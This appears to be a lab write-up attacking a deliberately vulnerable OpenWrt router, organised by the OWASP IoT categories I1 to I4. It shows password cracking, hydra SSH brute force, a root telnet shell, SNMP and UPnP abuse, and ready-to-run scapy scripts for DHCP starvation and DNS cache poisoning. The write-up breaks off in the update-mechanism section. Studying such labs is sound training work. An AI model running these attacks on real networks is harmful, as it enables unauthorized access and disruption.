# IoT:I1 - Weak Guessable, or Hardcoded Passwords
## Definition
> Use of easily bruteforced, publicly available, or unchangeable credentials, including backdoors in firmware or client software that grants unauthorized access to deployed systems.
## Description
By downloading the firmware and extracting it using [binwalk](https://github.com/ReFirmLabs/binwalk) the hashes from users can be obtained.

> Use *"binwalk -ev openwrt.img"* to extract firmware. (You can use the image storaged at /vulnzoo/releases or use your own compiled image).

```shell
❯ grep -Ri "pwned" /usr/share/wordlists/rockyou.txt
pwned5
lawlpwned1
wtfpwned1
ugotpwned
timpwnedj00
pwnedyou
pwnedftwha4
pwned<3wfuzz_breaks_openwrtuser_password
pwned69
pwned1
pwned00
pwned!
pwned
omgpwned
haiwinpwned
ericpwned
bxrpwned16
Asianspwned
808pwned
```

*pwned* appears in many typical password wordlists such as *rockyout.txt*, which can be used to crack the root user's password.

```zsh
❯ john --wordlist=/usr/share/wordlists/rockyout.txt hash.txt
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pwned            (?)
1g 0:00:00:00 100% 12.50g/s 1200p/s 1200c/s 1200C/s pwned5..ericpwned
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password for the user `openwrtuser` can be obtained using the **Combination** attack mode. With this type of attack, a combination from a list is performed.

```zsh
❯ hashcat -m 7400 -a 1 hash.txt user.txt /usr/share/wordlists/modified.txt --show
$5$ULxTq2Kzw066TUtC$Os/H7sHKmk9HXOz7hpyADUEbXn6NG2UAD6DxZGOQB5B:openwrtuserpwned
```

Another way to obtain the password for the `openwrtuser` user is through the administration interface. This displays a login panel when accessed. The `root` user is the only one allowed to access and change the router settings, but the system first validates whether the password entered matches the one the device has referenced for the user being entered, and then checks whether it is the authorized `root` user. For this reason, we can obtain the user password by brute force.

Using an incorrect password returns a 403 Forbidden error.

![[api1_root_invalid_login.png]]

If we use an existing user on the device, we cannot gain access, but we do obtain different codes when the password is correct.

![[api1_openwrtuser_invalid_login.png]]

![[api1_openwrtuser_login_401.png]]

This may allow the password to be obtained through a brute force process. I generated a user using a Python script that allowed me to generate mutated passwords with the user name and the suffix “pwned,” which generated a wordlist with the valid password. You can also use the “John The Reaper” option shown above.

![[api1_mutated_passwords.png]]
![[api1_wfuzz_openwrtuser_passwords.png]]

# IoT:I2 - Insecure Network Servicies
## Definition
> Unneeded or insecure network services running on the device itself, especially those exposed to the internet, that compromise the confidentiality, integrity/authenticity, or availability of information or allow unauthorized remote control ...
## Description
```shell
$ nmap -p- 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 11:43 CEST
Nmap scan report for 192.168.1.1
Host is up (0.0086s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
53/tcp   open     domain
80/tcp   open     http
445/tcp  open     microsoft-ds
3702/tcp open     ws-discovery
5515/tcp filtered unknown
5355/tcp open     llmnr
```
### 2.1 SSH (Secure Shell) port 22
```shell
$ nmap -p22 -sC -sV 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 11:45 CEST
Nmap scan report for 192.168.1.1
Host is up (0.00072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     Dropbear sshd (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

$ nmap --script ssh-auth-methods -p 22 192.168.2.1 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 13:26 +0100
Nmap scan report for vulnzoo.com (192.168.2.1)
Host is up (0.00048s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

If you try to log in via SSH with cracked credentials, the result will be the same. The router doesn't implement any security mechanisms to prevent brute force attacks via the SSH service. This is similar to what is seen in [[IoT Vulnerabilities#IoT I1 - Weak Guessable, or Hardcoded Passwords]]

```zsh
$ hydra -l openwrtuser -P ./mutated.txt ssh://192.168.2.1 -t 4 -V 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 13:28:05
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1023 login tries (l:1/p:1023), ~256 tries per task
[DATA] attacking ssh://192.168.2.1:22/
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedOPENWRTUSER" - 1 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedOpenwrtuser" - 2 of 1023 [child 1] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_OPENWRTUSER" - 3 of 1023 [child 2] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_Openwrtuser" - 4 of 1023 [child 3] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_openwrtuser" - 5 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedopenwrtuser" - 6 of 1023 [child 1] (0/0)
...
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuseromgpwned2024" - 866 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuseromgpwned2025" - 867 of 1023 [child 1] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuserpwned" - 868 of 1023 [child 2] (0/0)
[22][ssh] host: 192.168.2.1   login: openwrtuser   password: openwrtuserpwned
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 13:29:40
```

### 2.2 Samba 4.18.8
> **ON DEVELOPMENT**

### 2.3 Telnet
The Telnet service is concealed in the sense that it has been configured to use a non-default port. It is located on port 5515. In a general scan, it appears as a filtered port and the running service is not identified; however, by using `nmap` with version detection scripts and flags, it can eventually be discovered.

```shell
$ nmap -p5515 -sV -sC 192.168.2.1 -vvv           
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 09:09 +0100
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Initiating ARP Ping Scan at 09:09
Scanning 192.168.2.1 [1 port]
Completed ARP Ping Scan at 09:09, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:09
Completed Parallel DNS resolution of 1 host. at 09:09, 1.00s elapsed
DNS resolution of 1 IPs took 1.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating SYN Stealth Scan at 09:09
Scanning 192.168.2.1 [1 port]
Discovered open port 5515/tcp on 192.168.2.1
Completed SYN Stealth Scan at 09:09, 0.01s elapsed (1 total ports)
Initiating Service scan at 09:09
Scanning 1 service on 192.168.2.1
Completed Service scan at 09:09, 22.04s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.2.1.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 2.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 1.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Nmap scan report for 192.168.2.1
Host is up, received arp-response (0.00045s latency).
Scanned at 2026-01-20 09:09:02 CET for 25s

PORT     STATE SERVICE REASON         VERSION
5515/tcp open  telnet? syn-ack ttl 64
| fingerprint-strings: 
|   GenericLines, NULL: 
|     BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)
|   GetRequest: 
|     HTTP/1.0
|     BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)
|     HTTP/1.0
|_    /bin/sh: GET: not found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5515-TCP:V=7.98%I=7%D=1/20%Time=696F3824%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\n\r\n\r\nBu
SF:syBox\x20v1\.36\.1\x20\(2025-09-19\x2021:19:38\x20UTC\)\x20built-in\x20
SF:shell\x20\(ash\)\r\n\r\n~\x20#\x20")%r(GenericLines,65,"\xff\xfd\x01\xf
SF:f\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\n\r\n\r\nBusyBox\x20v1\.36\.1\x20
SF:\(2025-09-19\x2021:19:38\x20UTC\)\x20built-in\x20shell\x20\(ash\)\r\n\r
SF:\n~\x20#\x20\r\n~\x20#\x20\r\n~\x20#\x20")%r(GetRequest,9E,"\xff\xfd\x0
SF:1\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nGET\x20/\x20HTTP/1\.0\r\n\r\
SF:n\r\n\r\nBusyBox\x20v1\.36\.1\x20\(2025-09-19\x2021:19:38\x20UTC\)\x20b
SF:uilt-in\x20shell\x20\(ash\)\r\n\r\n~\x20#\x20GET\x20/\x20HTTP/1\.0\r\n/
SF:bin/sh:\x20GET:\x20not\x20found\r\n~\x20#\x20\r\n~\x20#\x20");
MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)

❯ telnet -a 192.168.2.1 5515
Trying 192.168.2.1...
Connected to 192.168.2.1.
Escape character is '^]'.



BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)

~ # whoami
root
~ # id
uid=0(root) gid=0(root)
~ # cat /proc/sys/kernel/hostname
OpenWrt
~ # 
```
### 2.4 FTP
FTP service runs on ftpd daemon. If we have a look inside /etc/init.d/ftpd script we will see that it has been used *'A'* option, which allows an "anonymous" log in.

It is also important to note that the FTP service is configured to use "/tmp" as the entry or "home" directory. This allows any user who logs in via FTP to access all files present in the router's system temporary directory.

```shell
#!/bin/sh /etc/rc.common

START=90
STOP=10

start() 
    echo "[+] Creating FTP directory"
    mkdir -p /tmp/ftp
    chmod 777 /tmp/ftp
    chown anonymous:anonymous /tmp/ftp
    echo "[+] Starting ftpd"
    tcpsvd -vE 0.0.0.0 21 ftpd -w -a anonymous /tmp &
}

stop() {
    echo "[+] Stopping ftpd"
    killall tcpsvd
    killall ftpd
}
```

We can easily check this out by scanning port 21 and running *"ftp-anon.nse"* script.

```shell
❯ nmap --script=ftp-anon -sV -p21 192.168.2.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 09:13 CEST
Nmap scan report for 192.168.1.1
Host is up (0.00075s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 
| Server status:
|  TYPE: BINARY
|_Ok
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
Service Info: Device: webcam; CPE: cpe:/h:dlink:dcs-932l

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds

❯ ftp 192.168.1.1
Connected to 192.168.1.1.
220 Operation successful
Name (192.168.1.1:xxx): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

### 2.5 SNMP
Net-SNMP version 5.9.4, used in various systems, has known vulnerabilities. These include ==buffer overflows, NULL pointer dereferences, and other issues related to handling malformed Object Identifiers (OIDs)==. Exploitation of these vulnerabilities can lead to out-of-bounds memory access, crashes, or denial-of-service conditions. Users are advised to upgrade to the latest version of Net-SNMP or apply relevant security patches. 

Specific Vulnerabilities in Net-SNMP 5.9.4:

- [Memory leak](https://www.cvedetails.com/cve/CVE-2024-26464/)

- **[Buffer Overflow](https://nvd.nist.gov/vuln/detail/CVE-2025-68615):** CVSS  9.8 Critical (RCE attack)

- **Malformed OID Handling:**
    Several vulnerabilities involve the improper handling of malformed OIDs in SET and GET-NEXT requests to various MIB tables, leading to NULL pointer dereferences or out-of-bounds memory access. These vulnerabilities affect the master agent and subagents. 

- **Vulnerability Exploitation:**
    Attackers can exploit these vulnerabilities by crafting malicious network traffic, including specially crafted SNMP packets. To exploit vulnerabilities in SNMP v2c or earlier, attackers need valid community strings, while SNMP v3 exploitation requires valid user credentials.

We can expose system's information using nmap scripts:

```shell
$ sudo nmap -p161 -sU -sC -sV 192.168.2.1
[sudo] password for d4str3k: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 14:16 +0100
Nmap scan report for vulnzoo.com (192.168.2.1)
Host is up (0.00053s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux OpenWrt 6.6.104 #0 SMP Fri Sep 19 21:19:38 2025 armv7l
|_  System uptime: 1h16m41.05s (460105 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 38f58227eedbcd6800000000
|   snmpEngineBoots: 1
|_  snmpEngineTime: 1h16m41s
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 130.54 Kb sent, 130.54 Kb received
|   eth0
|     IP address: 192.168.2.1  Netmask: 255.255.255.0
|     MAC address: b8:27:eb:79:53:c3 (Raspberry Pi Foundation)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 88.96 Kb sent, 63.48 Kb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:8080         0.0.0.0:0
|   TCP  192.168.2.1:22       0.0.0.0:0
|   TCP  192.168.2.1:22       192.168.2.2:59938
|_  UDP  0.0.0.0:161          *:*
MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)
Service Info: Host: OpenWrt

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```

#### 2.5.1 Default Community Strings Configuration
The SNMP service is configured with default community strings that are widely known and documented, representing a critical security vulnerability in IoT deployments.

**Vulnerable Configuration (`/etc/snmp/snmpd.conf`):**
```
rocommunity public
rwcommunity private
sysLocation "VulnZoo RoutCoon Lab"
sysContact "admin@vulnzoo.local"
```

**Risk Analysis:**

| Community | Type       | Risk Level   | Description                                                |
| --------- | ---------- | ------------ | ---------------------------------------------------------- |
| `public`  | Read-Only  | **High**     | Allows unauthorized information disclosure to any attacker |
| `private` | Read-Write | **Critical** | Permits configuration changes without authentication       |

**Exploitation Impact:**
1. **Information Disclosure via `public` community:**

An attacker can enumerate the entire device configuration without authentication:

```shell
# Extract system information
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.1

# Enumerate network interfaces and IP addresses
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.2.2

# Extract ARP table (discover connected devices)
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.4.22

# View routing table
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.4.21

# List running processes
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.25.4.2

# Enumerate storage and filesystems
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.25.2.3
```

2. **Network Mapping:**
The extracted ARP table (`1.3.6.1.2.1.4.22`) reveals all devices connected to the router, enabling lateral movement planning:

```
iso.3.6.1.2.1.4.22.1.2.2.192.168.2.2 = Hex-STRING: B8 27 EB 79 53 C4
iso.3.6.1.2.1.4.22.1.2.2.192.168.2.10 = Hex-STRING: AA BB CC DD EE FF
```

3. **Write Access Attempts via `private` community:**
Although modern SNMP agents restrict writable OIDs, the presence of `rwcommunity private` exposes the device to:
- Modification of system contact and location information
- Configuration changes if extended MIBs are enabled
- Potential command execution via SNMP extensions
  
```shell
# Attempt to modify system contact (will fail on restricted views, but demonstrates exposure)
snmpset -v 2c -c private 192.168.2.1 1.3.6.1.2.1.1.4.0 s "compromised@attacker.com"
```

**Attack Chain Integration:**

The SNMP information disclosure vulnerability can be chained with other attacks:

1. **Reconnaissance Phase:** SNMP enumeration provides the attacker with:
	- Operating system version (Linux OpenWrt 6.6.104 armv7l)
	- System uptime (indicates last reboot/patch cycle)
	- Network topology and connected devices
	- Open ports and services (via TCP/UDP connection tables)
2. **Credential Targeting:** The `sysContact` field may contain valid email addresses or usernames that can be used in phishing campaigns or password spraying attacks.
3. **Firmware Vulnerability Correlation:** The exact OS version obtained via SNMP (`iso.3.6.1.2.1.1.1.0`) allows attackers to search for specific CVEs affecting that OpenWrt version.

**Regulatory Compliance Impact:**
This configuration violates multiple security standards:
- **ETSI EN 303 645**: Requirement for unique credentials and secure authentication
- **IEC 62443**: Network segmentation and secure device management
- **EU Cyber Resilience Act**: Lack of security by design

**Remediation:**
Replace default communities with cryptographically random strings:

```

# Secure configuration
rocommunity VulnZooR0utC00nR34d0nly 127.0.0.1/32

# rwcommunity should be disabled or restricted to specific management hosts

# rwcommunity VulnZooWr1t3S3cur3! 192.168.2.100/32

```

Additionally, SNMP should be disabled if not required, or restricted to localhost-only access via firewall rules.
### 2.6 UPNP
The device exposes Universal Plug and Play (UPnP) IGD (Internet Gateway Device) services on the local network interface with security controls disabled. The `secure_mode=no` configuration allows unauthenticated clients to submit port mapping requests, exposing the internal network topology and firewall configuration to manipulation. While the specific port mapping action failed with error 501 due to laboratory environment constraints (absence of WAN NAT capabilities), the service accepted and processed the malicious SOAP request without authentication, confirming the vulnerability exists in the configuration layer.


OpenWRT is running miniupnpd and it is listening on port 5000.
```shell
root@OpenWrt:~# netstat -tulnp | grep miniupnpd
tcp        0      0 :::5000                 :::*                    LISTEN      4497/miniupnpd # UPnP HTTP Control
udp        0      0 0.0.0.0:5351            0.0.0.0:*                           4497/miniupnpd # NAT-PMP
udp        0      0 0.0.0.0:1900            0.0.0.0:*                           4497/miniupnpd # SSDP Discovery
udp        0      0 0.0.0.0:50345           0.0.0.0:*                           4497/miniupnpd # SSDP Response Ephemeral
```

*/etc/miniupnpd/miniupnpd.conf*

```shell
ext_ifname=eth0
listening_ip=eth0
port=5000
enable_upnp=yes
enable_natpmp=yes
secure_mode=no
bitrate_down=10240000
bitrate_up=10240000
uuid=05f16a8d-4cc7-4bb1-a894-98ca59bb3ea0
allow 0-65535 192.168.2.0/24 0-65535
deny 0-65535 0.0.0.0/0 0-65535
lease_file=/var/run/miniupnpd.leases
force_igd_desc_v1=yes
```

- `secure-mode=no`: Critical, it allows port mapping to any internal IP. Permits thirds-party redirection.

#### Vulnerability Evidence:
The SSDP multicast discovery successfully identified the router's UPnP services without authentication:

```shell
$ gssdp-discover -i eth0 --timeout=3
resource available
  USN:      uuid:05f16a8d-4cc7-4bb1-a894-98ca59bb3ea0::urn:schemas-upnp-org:device:InternetGatewayDevice:2
  Location: http://192.168.2.1:5000/rootDesc.xml
```

Using the discovered control endpoint, an unauthorized port mapping request was submitted from a non-privileged network position:

```shell
$ upnpc -u http://192.168.2.1:44997/rootDesc.xml -a 192.168.2.2 80 9999 TCP
upnpc: miniupnpc library test client, version 2.3.3.
Found valid IGD : http://192.168.2.1:44997/ctl/IPConn 
Local LAN ip address : 192.168.2.2
ExternalIPAddress = 1.2.3.4
AddPortMapping(9999, 80, 192.168.2.2) failed with code 501 (Action Failed)
```

The HTTP 501 (Action Failed) response **confirms the vulnerability** despite the operational failure:

1. **Request Acceptance:** The SOAP request was accepted and parsed (no 401 Unauthorized or 403 Forbidden).
    
2. **Processing Reached Execution Phase:** The service attempted to execute `AddPortMapping` rather than rejecting it at the authentication/authorization layer.
    
3. **Failure Mode:** The error occurred at the iptables/NAT implementation layer (environmental limitation in lab setup), not at the security policy layer.
    
4. **Information Disclosure:** The response confirmed the spoofed `ExternalIPAddress` (1.2.3.4), revealing the router's perceived WAN identity.

#### **Risk Assessment**

**Attack Scenarios Validated:**

1. **Cross-Device Port Forwarding (Integrity Violation)**  
    An attacker on Host A (192.168.2.100) could theoretically map external ports to Host B (192.168.2.2) without Host B's consent, exposing internal services to external access.
    
2. **Network Topology Reconnaissance (Confidentiality Breach)**  
    The SSDP discovery and XML descriptor exposure reveal network architecture, device capabilities, and potential attack vectors to unauthenticated LAN participants.
    
3. **Firewall Configuration Tampering (Availability Risk)**  
    While the specific mapping failed, the ability to submit arbitrary `DeletePortMapping` or `GetGenericPortMappingEntry` actions could disrupt legitimate network services.

### 2.7 DHCP && DNS

The `dnsmasq.conf` configuration file has a number of features that make it potentially vulnerable.
#### 1. Service exposure
`interface=br-lan,eth0,wlan0` and `bind-interfaces` allow the service to be accessible from external networks.
#### 2. Configuration files in /tmp
Critical files are stored in the temporary directory, such as `/tmp/dhcp.leases, /tmp/hosts, /tmp/dhcp_events.log`. Any user/process can modify the DHCP/DNS configurations.

Potential vulnerabilities:
- Injection of fake DHCP leases.
- Modification of local DNS resolution.
- Manipulation of logs to hide malicious activity ([[IoT Vulnerabilities#IoT7 Insecure Data Transfer and Storage]])
- Discovery of other devices on the network, facilitating `pivoting`.
3. Script executed as root
The `dnsmasq.script` script referenced in the configuration is executed with root privileges.

This introduces a number of potential vulnerabilities, such as:
- No sanitization of argument input.
- Conditional execution based on client hostname.
- Possible command injection if variables are manipulated.

The impact of these risks can lead to root privilege escalation if exploited.

This insecure custom logic is related to [[IoT Vulnerabilities#IoT5 Using Insecure or Outdated Components]].
#### 4. Lack of Rate Limiting
There are no limits on DHCP/DNS requests (`dhcp-rapid-commit` is commented out). This makes the service vulnerable to DoS attacks.

- DHCP Starvation (IP pool).
- DNS amplification.
- Resource exhaustion (CPU/memory).

This is related to the risk [[IoT Vulnerabilities#IoT I8 - Lack of device management]].
#### 5. Some configurations that are not recommended
- `stop-dns-rebind` disabled.
- `cache-size=10000` large and without validation.
- `no-negcache` enabled.
- `dhcp-lease-max=100000` too high.
- `dhcp-authoritative` without validation.
- `read-ethers` enabled without protection.
These configurations are insecure and enable possible impacts such as DNS rebinding and DNS Cache Poisoning.
> **CHECK ATTACKS**

The DHCP and DNS service configuration is insecure. This allows for a series of attacks that could be tested by analyzing the consequences of the different configuration options that have been recorded:

- Modification of the *leases* file
```zsh
echo "0 00:11:22:33:44:55 192.168.1.50 fake-host 01:00:11:22:33:44:55" > /tmp/dhcp.leases
killall -HUP dnsmasq
```

- DHCP Starvation Attack
```python
from scapy.all import *
import time

def dhcp_starvation():
    conf.checkIPaddr = False
    for i in range(1000):
        mac = RandMAC()
        dhcp_discover = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / \
                       IP(src='0.0.0.0', dst='255.255.255.255') / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=mac) / \
                       DHCP(options=[('message-type','discover'), 'end'])
        sendp(dhcp_discover, iface='eth0', verbose=0)
        time.sleep(0.01)
dhcp_starvation()
```

- *DNS Cache Poisoning*
```python
from scapy.all import *

def dns_poison():
    ip = IP(src='8.8.8.8', dst='192.168.1.1')
    udp = UDP(sport=53, dport=33333)
    dns = DNS(id=12345, qr=1, aa=1, qd=DNSQR(qname='google.com', qtype='A'),
               an=DNSRR(rrname='google.com', type='A', ttl=300, rdata='192.168.1.200'))
    send(ip/udp/dns, verbose=1)

dns_poison()
```
# IoT:I3 - Insecure Ecosystem Interfaces

> **VERY BASIC VULNERABILITY:** It would be advisable to relegate this vulnerability to the mobile interface, as it falls within the scope indicated by OWASP.
## Definition
> Insecure web, backend API, cloud, or **mobile interfaces** in the ecosystem outside of the device that allows compromise of the device or its related components. Common issues include a lack of authentication/authorization, lacking or weak encryption, and a lack of input and output filtering.

Using wordlists for endpoints, we can find firsthand that there is a `/cgi-bin/luci/admin` subroutine. This is revealed by the fact that we get a `Forbidden 403` code compared to non-existent routes that report a `Not Found 404`.

![[iot3_fuzzing_admin_endpoint.png]]

However, due to the configuration of `dispatcher.lua`, starting from a valid subdirectory, the rest of the subdirectories do not report a `Not Found` error even if they do not exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ"                                            
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   403        91 L     208 W      2897 Ch     "foobar"                                                                                                                     
000000002:   403        91 L     208 W      2896 Ch     "admin"                                                                                                                      
000000001:   403        91 L     208 W      2897 Ch     "system"                                                                                                                     
000000004:   403        91 L     208 W      2896 Ch     "tried"                                                                                                                      

Total time: 0.158685
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 25.20710
```

We cannot differentiate between which endpoints exist and which do not based on what the server reports. However, if we test the interface a little, we notice some strange behavior.

![[iot3_interface_exposes_endpoint.png]]

If we try to access a directory that is unlikely to exist, such as `/cgi-bin/luci/admin/foobar`, we see a message pop up saying that the resource does not exist. If we try fuzzing with incorrect login data, we can see that there are changes between different requests, which tells us which subroutes exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000001:   403        94 L     219 W      3005 Ch     "system"                                                                                                                     
000000003:   403        98 L     231 W      3109 Ch     "foobar"                                                                                                                     
000000002:   403        98 L     231 W      3108 Ch     "admin"                                                                                                                      
000000004:   403        98 L     231 W      3108 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0


```

As you can see, subroutes that do not have the message take up less space, and despite the `Forbidden` code in all requests, it is now possible to discern which ones do exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000002:   403        94 L     219 W      3011 Ch     "admin"                                                                                                                      
000000003:   403        98 L     231 W      3116 Ch     "foobar"                                                                                                                     
000000001:   403        94 L     219 W      3012 Ch     "system"                                                                                                                     
000000004:   403        98 L     231 W      3115 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0
```

We have obtained the endpoints `/cgi-bin/luci/admin/system/admin` and `/cgi-bin/luci/admin/system/system`.


# IoT:I4 - Lack of Secure Update Mechanism
## Definition
> Lack of ability to securely update the device. This includes lack of firmware validation on device, lack of secure delivery (un-encrypted in transit), lack of anti-rollback mechanisms, and lack of notifications of security changes due to updates.
## Description
OpenWrt uses a lightweight package manager called `opkg`. The system relies entirely on the paths defined in `/etc/opkg/distfeeds.conf`.

The security system is not as good as with *APT* because OpenWRT does not individually sign packages.
### 1. Repository replacement
One valid option could be to modify the contents of */etc/opkg/distfeeds.conf* so that it points to a local URL located on our attacking machine. This would allow a malicious *.ipk* file to be uploaded.

To carry out this type of attack, we need to gain access to the file somehow, and to do this we can perform a privilege escalation.
### 2. Misconfiguration of the opkg.conf file
The configuration of the opkg tool for installing packages resides in the */etc/opkg.conf* file. This file has an option that is insecure:
![[iot4_opkg_misconfiguration.png]]

The ‘0’ in the *check_signature* option indicates that the tool never checks whether the package being installed has a valid signature. This is also related to the risk [[IoT Vulnerabilities#No. 9 Insecure Default Settings]].

#### #### 1.2.  Escalating privileges with cron tasks

We can detect in the firmware that there is a file in */etc/crontabs* called *root* that executes a cron task. Inside, we find this:

```shell
*/3 * * * * /opt/oem-updates/scripts/auto-updater.sh
```

